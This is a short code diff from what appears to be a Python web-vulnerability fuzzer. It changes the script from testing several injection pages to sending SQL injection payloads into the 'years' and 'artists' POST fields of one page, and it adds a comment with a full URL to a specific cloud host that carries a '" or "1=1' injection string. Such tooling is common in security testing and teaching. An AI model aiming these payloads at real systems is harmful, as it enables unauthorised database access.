@@ -98,19 +98,12 @@ if __name__ == "__main__":
 
 	
 	## check all pages
-	payloads = get_payloads()
-	url_list = ['/directorytraversal/directorytraversal.php',
-				"/commandinjection/commandinjection.php",
-				"/sqli/sqli.php",
-				"/serverside/eval2.php",
-				"/openredirect/openredirect.php",
-				"/serverside/serverside.php"]
+	payloads = sqli.get_all()
+	url_list = ['/selections.php']
+
+# http://ec2-54-254-145-200.ap-southeast-1.compute.amazonaws.com:8080/selections.php?years=%22%20or%20%221=1
 
 
 	for payload in payloads:
-		injectPayload(url_list[0],  'GET','ascii', {"ascii":"cat","utf":"dog"},payload)
-		injectPayload(url_list[1], 'POST', "host", {"host":""},payload)
-		injectPayload(url_list[2],  "POST", "username", {"username":""}, payload)
-		injectPayload(url_list[3],  "GET", "page", {"page":""}, payload)
-		injectPayload(url_list[4],  "GET", "redirect",{"redirect":""}, payload)
-		injectPayload(url_list[5], "GET", "page", {"page":"apples"}, payload)
+		injectPayload(url_list[0],  "POST", "years", {"years":""}, payload)
+		injectPayload(url_list[0],  "POST", "artists", {"artists":""}, payload)
